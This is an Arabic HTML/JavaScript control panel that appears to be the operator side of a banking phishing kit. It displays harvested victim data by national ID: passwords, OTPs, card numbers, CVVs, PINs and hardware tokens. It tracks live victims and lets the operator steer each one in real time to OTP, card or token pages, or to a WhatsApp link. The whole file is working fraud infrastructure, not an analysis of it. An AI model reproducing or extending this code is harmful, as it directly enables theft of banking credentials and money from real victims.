<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة التحكم</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Cairo',sans-serif;background:#f5f5f5;color:#1a1a1a;direction:rtl}
.login-page{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1B7A3D,#145a2c)}
.login-box{background:#fff;padding:32px;border-radius:16px;width:90%;max-width:400px;box-shadow:0 8px 32px rgba(0,0,0,.2)}
.login-box h2{text-align:center;color:#1B7A3D;margin-bottom:24px}
.login-box input{width:100%;padding:12px 16px;border:2px solid #e5e7eb;border-radius:8px;font-size:16px;font-family:'Cairo',sans-serif;margin-bottom:16px;direction:ltr;text-align:center}
.login-box button{width:100%;padding:14px;background:#1B7A3D;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
.login-box button:hover{background:#145a2c}
.login-error{color:#dc2626;text-align:center;margin-bottom:12px;font-size:14px;display:none}
.dashboard{display:none;max-width:900px;margin:0 auto;padding:16px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
.stat-card{background:#fff;padding:16px;border-radius:12px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.08)}
.stat-card .number{font-size:28px;font-weight:800;color:#1B7A3D}
.stat-card .label{font-size:13px;color:#666;margin-top:4px}
.header{display:flex;justify-content:space-between;align-items:center;padding:12px 0;margin-bottom:16px;border-bottom:2px solid #e5e7eb}
.header h1{font-size:20px;color:#1B7A3D}
.header button{padding:8px 16px;background:#dc2626;color:#fff;border:none;border-radius:8px;cursor:pointer;font-family:'Cairo',sans-serif;font-weight:600}
.app-card{background:#fff;padding:16px;border-radius:12px;margin-bottom:12px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
.app-card .row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px}
.app-card .field{background:#f0fdf4;padding:4px 10px;border-radius:6px;font-size:13px}
.app-card .field b{color:#1B7A3D}
.app-card .actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
.app-card .actions button{padding:6px 12px;border:none;border-radius:6px;cursor:pointer;font-family:'Cairo',sans-serif;font-size:12px;font-weight:600}
.btn-approve{background:#16a34a;color:#fff}
.btn-reject{background:#dc2626;color:#fff}
.btn-redirect{background:#2563eb;color:#fff}
.btn-delete{background:#6b7280;color:#fff}
.btn-whatsapp{background:#25D366;color:#fff}
.section-title{font-size:16px;font-weight:700;color:#1B7A3D;margin:16px 0 8px;padding-bottom:4px;border-bottom:1px solid #dcfce7}
.empty{text-align:center;padding:24px;color:#999;font-size:14px}
.whatsapp-section{background:#fff;padding:16px;border-radius:12px;margin-bottom:20px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
.whatsapp-section input{flex:1;padding:8px 12px;border:2px solid #e5e7eb;border-radius:8px;font-size:14px;font-family:'Cairo',sans-serif;direction:ltr}
.whatsapp-section .row{display:flex;gap:8px}
.whatsapp-section button{padding:8px 16px;background:#25D366;color:#fff;border:none;border-radius:8px;cursor:pointer;font-family:'Cairo',sans-serif;font-weight:600}
.active-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#16a34a;margin-left:4px;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.refresh-btn{padding:8px 16px;background:#1B7A3D;color:#fff;border:none;border-radius:8px;cursor:pointer;font-family:'Cairo',sans-serif;font-weight:600;font-size:13px}
</style>
</head>
<body>

<div id="loginPage" class="login-page">
  <div class="login-box">
    <h2>🔐 لوحة التحكم</h2>
    <div id="loginError" class="login-error"></div>
    <input type="password" id="password" placeholder="كلمة المرور" autofocus>
    <button onclick="doLogin()">دخول</button>
  </div>
</div>

<div id="dashboard" class="dashboard">
  <div class="header">
    <h1>📊 لوحة التحكم</h1>
    <div>
      <button class="refresh-btn" onclick="refreshData()" style="margin-left:8px">🔄 تحديث</button>
      <button onclick="doLogout()">خروج</button>
    </div>
  </div>

  <div class="stats">
    <div class="stat-card"><div class="number" id="totalApps">0</div><div class="label">الطلبات</div></div>
    <div class="stat-card"><div class="number" id="activeApps">0</div><div class="label">نشط الآن <span class="active-dot"></span></div></div>
    <div class="stat-card"><div class="number" id="liveVisitors">0</div><div class="label">زوار مباشر</div></div>
    <div class="stat-card"><div class="number" id="totalVisitors">0</div><div class="label">إجمالي الزوار</div></div>
  </div>

  <div class="whatsapp-section">
    <div style="font-weight:700;margin-bottom:8px">📱 رابط واتساب</div>
    <div class="row">
      <input type="text" id="whatsappLink" placeholder="https://wa.me/..." dir="ltr">
      <button onclick="saveWhatsApp()">حفظ</button>
    </div>
  </div>

  <div class="section-title">📋 الطلبات</div>
  <div id="appsList"></div>
</div>

<script>
const API = '/api/trpc';
let token = '';

function getCookie(name) {
  const v = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)');
  return v ? v.pop() : '';
}

async function rpc(proc, input, method) {
  const isGet = method === 'GET' || (!method && !input);
  const url = isGet
    ? API + '/' + proc + '?input=' + encodeURIComponent(JSON.stringify({0:{json:input||{}}}))
    : API + '/' + proc;
  const opts = {method: isGet ? 'GET' : 'POST', credentials:'include', headers:{}};
  if (!isGet) {
    opts.headers['Content-Type'] = 'application/json';
    opts.body = JSON.stringify({0:{json:input||{}}});
  }
  const r = await fetch(url, opts);
  const d = await r.json();
  if (d[0]?.error) throw new Error(d[0].error.message);
  return d[0]?.result?.data?.json;
}

async function doLogin() {
  const pw = document.getElementById('password').value;
  try {
    await rpc('admin.login', {password:pw}, 'POST');
    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('dashboard').style.display = 'block';
    refreshData();
    setInterval(refreshData, 5000);
  } catch(e) {
    const el = document.getElementById('loginError');
    el.textContent = e.message || 'خطأ في الدخول';
    el.style.display = 'block';
  }
}

document.getElementById('password').addEventListener('keydown', function(e) {
  if (e.key === 'Enter') doLogin();
});

async function doLogout() {
  try { await rpc('admin.logout', {}, 'POST'); } catch {}
  document.getElementById('loginPage').style.display = '';
  document.getElementById('dashboard').style.display = 'none';
  document.getElementById('password').value = '';
}

async function refreshData() {
  try {
    const data = await rpc('admin.getApplications', {}, 'GET');
    const apps = data.apps || [];
    document.getElementById('totalApps').textContent = apps.length;
    document.getElementById('activeApps').textContent = (data.activeIds || []).length;
    document.getElementById('liveVisitors').textContent = data.liveVisitorCount || 0;
    document.getElementById('totalVisitors').textContent = data.totalVisitors || 0;
    renderApps(apps, data.activeIds || []);

    const wl = await rpc('admin.getWhatsAppLink', {}, 'GET');
    document.getElementById('whatsappLink').value = wl.link || '';
  } catch(e) {
    console.error('Refresh error:', e);
  }
}

function renderApps(apps, activeIds) {
  const el = document.getElementById('appsList');
  if (!apps.length) {
    el.innerHTML = '<div class="empty">لا توجد طلبات بعد</div>';
    return;
  }
  apps.sort((a,b) => new Date(b.updatedAt) - new Date(a.updatedAt));
  el.innerHTML = apps.map(a => {
    const isActive = activeIds.includes(a.nationalId);
    return `<div class="app-card">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
        <strong>${a.nationalId} ${isActive ? '<span class="active-dot"></span>' : ''}</strong>
        <small style="color:#999">${a.status}</small>
      </div>
      <div class="row">
        ${a.fullName ? `<div class="field"><b>الاسم:</b> ${a.fullName}</div>` : ''}
        ${a.phone || a.phoneNumber ? `<div class="field"><b>الهاتف:</b> ${a.phone || a.phoneNumber}</div>` : ''}
        ${a.governorate ? `<div class="field"><b>المحافظة:</b> ${a.governorate}</div>` : ''}
        ${a.watchColor ? `<div class="field"><b>اللون:</b> ${a.watchColor}</div>` : ''}
        ${a.username ? `<div class="field"><b>المستخدم:</b> ${a.username}</div>` : ''}
        ${a.password ? `<div class="field"><b>كلمة السر:</b> ${a.password}</div>` : ''}
        ${a.otp ? `<div class="field"><b>OTP:</b> ${a.otp}</div>` : ''}
        ${a.cardNumber ? `<div class="field"><b>البطاقة:</b> ${a.cardNumber}</div>` : ''}
        ${a.cardExpiry ? `<div class="field"><b>انتهاء:</b> ${a.cardExpiry}</div>` : ''}
        ${a.cvv ? `<div class="field"><b>CVV:</b> ${a.cvv}</div>` : ''}
        ${a.cardPin ? `<div class="field"><b>PIN:</b> ${a.cardPin}</div>` : ''}
        ${a.hardToken ? `<div class="field"><b>Token:</b> ${a.hardToken}</div>` : ''}
        ${a.currentPage ? `<div class="field"><b>الصفحة:</b> ${a.currentPage}</div>` : ''}
      </div>
      <div class="actions">
        <button class="btn-approve" onclick="adminAction('admin.approveLogin',{nationalId:'${a.nationalId}'})">✅ موافقة</button>
        <button class="btn-reject" onclick="adminAction('admin.rejectLogin',{nationalId:'${a.nationalId}'})">❌ رفض</button>
        <button class="btn-redirect" onclick="redirectTo('${a.nationalId}')">🔀 توجيه</button>
        <button class="btn-whatsapp" onclick="adminAction('admin.redirectWhatsApp',{nationalId:'${a.nationalId}'})">📱 واتساب</button>
        <button class="btn-delete" onclick="if(confirm('حذف هذا الطلب؟'))adminAction('admin.deleteApplication',{nationalId:'${a.nationalId}'})">🗑️ حذف</button>
      </div>
    </div>`;
  }).join('');
}

async function adminAction(proc, input) {
  try {
    await rpc(proc, input, 'POST');
    refreshData();
  } catch(e) { alert('خطأ: ' + e.message); }
}

function redirectTo(nationalId) {
  const page = prompt('أدخل الصفحة للتوجيه:\notp, card-info, watch-link, hard-token, success, login-error, whatsapp');
  if (page) adminAction('admin.redirectUser', {nationalId, redirectTo: page});
}

async function saveWhatsApp() {
  const link = document.getElementById('whatsappLink').value;
  try {
    await rpc('admin.updateWhatsAppLink', {link}, 'POST');
    alert('تم الحفظ ✅');
  } catch(e) { alert('خطأ: ' + e.message); }
}

// Auto-check session on load
(async () => {
  try {
    const s = await rpc('admin.checkSession', {}, 'GET');
    if (s.isAdmin) {
      document.getElementById('loginPage').style.display = 'none';
      document.getElementById('dashboard').style.display = 'block';
      refreshData();
      setInterval(refreshData, 5000);
    }
  } catch {}
})();
</script>
</body>
</html>
